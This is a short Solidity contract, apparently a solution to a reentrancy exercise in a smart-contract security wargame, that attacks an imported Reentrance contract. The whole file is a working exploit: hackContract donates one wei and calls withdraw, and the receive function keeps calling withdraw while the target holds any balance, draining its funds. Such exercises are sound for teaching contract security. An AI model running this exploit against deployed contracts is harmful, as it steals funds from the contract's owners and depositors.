// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance reentrance;
    
    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external payable {
        // Code me!
        reentrance = Reentrance(contractAddress);
        reentrance.donate{value: 1}(address(this));
        reentrance.withdraw();
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw();
        }
    }    
}
